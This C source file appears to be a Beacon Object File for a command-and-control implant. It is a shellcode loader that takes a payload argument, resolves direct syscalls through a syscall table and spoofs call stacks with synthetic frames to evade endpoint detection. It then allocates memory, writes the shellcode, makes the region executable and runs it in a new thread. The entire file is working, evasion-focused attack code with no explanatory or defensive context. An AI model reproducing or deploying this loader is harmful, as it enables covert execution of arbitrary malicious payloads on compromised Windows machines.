#include <windows.h>
#include <stdio.h>

#include "Native.h"
#include "Vulcan.h"
#include "VxTable.h"
#include "Macros.h"
#include "Draugr.h"
#include "Beacon.h"

void go(char *args, int alen) {

	VX_TABLE				VxTable = { 0 };
	SYNTHETIC_STACK_FRAME	SyntheticStackframe = { 0 };
	datap					parser = { 0 };
	char					*shellcode = NULL;
	int						shellcode_len = 0;
	PVOID					AllocatedAddr = NULL;
	SIZE_T					AllocationSize = 0;
	NTSTATUS				Status = 0;
	SIZE_T					bytesWritten = 0;
	ULONG					oldProtect = 0;
	PVOID					protectBase = NULL;
	SIZE_T					protectSize = 0;
	HANDLE					hThread = NULL;

	BeaconDataParse(&parser, args, alen);
	shellcode = BeaconDataExtract(&parser, &shellcode_len);
	if (!shellcode || shellcode_len <= 0) {
		BeaconPrintf(CALLBACK_ERROR, "No shellcode provided\n");
		return;
	}

	if (!InitVxTable(&VxTable)) {
		BeaconPrintf(CALLBACK_ERROR, "Error during InitVxTable !\n");
		return;
	}

	if (!DraugrInit(&SyntheticStackframe)) {
		BeaconPrintf(CALLBACK_ERROR, "Error during DraugrInit !\n");
		return;
	}

	AllocationSize = (SIZE_T)((shellcode_len + 0xFFF) & ~0xFFF);
	if (AllocationSize < 0x1000)
		AllocationSize = 0x1000;

	Status = (NTSTATUS)DRAUGR_SYSCALL(NtAllocateVirtualMemory, NtCurrentProcess, &AllocatedAddr, 0, &AllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (NT_ERROR(Status)) {
		BeaconPrintf(CALLBACK_ERROR, "NtAllocateVirtualMemory failed: 0x%08lx\n", Status);
		return;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Allocated RW region at %p (%lu bytes)\n", AllocatedAddr, (unsigned long)AllocationSize);

	Status = (NTSTATUS)DRAUGR_SYSCALL(NtWriteVirtualMemory, NtCurrentProcess, AllocatedAddr, shellcode, shellcode_len, &bytesWritten);
	if (NT_ERROR(Status)) {
		BeaconPrintf(CALLBACK_ERROR, "NtWriteVirtualMemory failed: 0x%08lx\n", Status);
		return;
	}

	protectBase = AllocatedAddr;
	protectSize = AllocationSize;
	Status = (NTSTATUS)DRAUGR_SYSCALL(NtProtectVirtualMemory, NtCurrentProcess, &protectBase, &protectSize, PAGE_EXECUTE_READ, &oldProtect);
	if (NT_ERROR(Status)) {
		BeaconPrintf(CALLBACK_ERROR, "NtProtectVirtualMemory failed: 0x%08lx\n", Status);
		return;
	}

	Status = (NTSTATUS)DRAUGR_SYSCALL(NtCreateThreadEx, &hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess, (PVOID)AllocatedAddr, NULL, 0, 0, 0, 0, NULL);
	if (NT_ERROR(Status)) {
		BeaconPrintf(CALLBACK_ERROR, "NtCreateThreadEx failed: 0x%08lx\n", Status);
		return;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "[+] Shellcode thread started (%d bytes)\n", shellcode_len);
	if (hThread)
		CloseHandle(hThread);
}
